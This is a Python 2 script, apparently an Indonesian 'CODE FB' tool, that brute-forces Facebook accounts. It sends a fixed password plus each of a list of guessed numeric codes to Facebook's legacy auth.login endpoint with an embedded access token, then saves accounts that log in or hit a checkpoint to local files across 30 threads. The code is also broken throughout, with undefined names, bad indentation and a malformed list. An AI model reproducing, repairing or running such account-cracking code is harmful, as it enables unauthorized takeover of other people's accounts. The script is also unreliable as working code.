#!/usr/bin/python
import smtplib
import time
import os
import requests
import sys
import random

nom = []
cod = ["012345", "123456", "234561", "456783","567890", "678901", "6789012", "789012", "890123", "901234", "101234", "111234", "121234", "131234", "141234", "151234", "161234", "171234", "181234", "191234", "201234", "211234", "223456" "234567", "245678", "256789", "267890", "278901", "289012", "290123", "30123", "312345", "323456", "334567", "345678", "456789", "467890", "478901", "489012", "490123", "501234", "512345", "523456", "534567", "545678", "556789", "567890", "578901", "589012", "590123", "60123", "61234", "623456", "637890", "645678", "656789", "667890", "678901", "689012", "690123", "700987", "712938", "723847", "734756", "745610", "750192", "767089", "778019", "789012", "790129", "801928", "812837", "823948", "834756", "841028", "8545", "8612", "87", "88756", "89012", "9012"]

def login():
	os.system('clear')
	os.system('figlet CODE FB')
	nom = raw_input("\033[1;93mNOMOR HP \033[1;97m: ")



def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = 786786
			code = open('cod', 'a')
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=' + code + '&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + user +   ' | '  +  pass1 + code
				okb = open('save/successfull.txt', 'a')
				okb.write(user+'|'+pass1+code+'\n')
				okb.close()
				oks.append(user+pass1+code)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + user +   ' | '  +  pass1 + code
					cps = open('save/checkpoint.txt', 'a')
					cps.write(user+'|'+pass1+code+'\n')
					cps.close()
					cpb.append(user+pass1+code)

		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;96m="
	print '\033[1;96m[✓] \033[1;93mProcess Telah Selesai ...'
	print '\033[1;96m[✓] \033[1;34mTotal OK : \033[1;97m'+str(len(oks))
	print '\033[1;96m[✓] \033[1;93mTotal CP  : \033[1;97m'+str(len(cpb))
	print('\033[1;96m[✓] \033[1;91mCP File Telah Disimpan : save/cp.txt')
	raw_input('\033[1;96m[\033[1;97mKembali\033[1;96m]')
	login()


if __name__=='__main__':
	main()
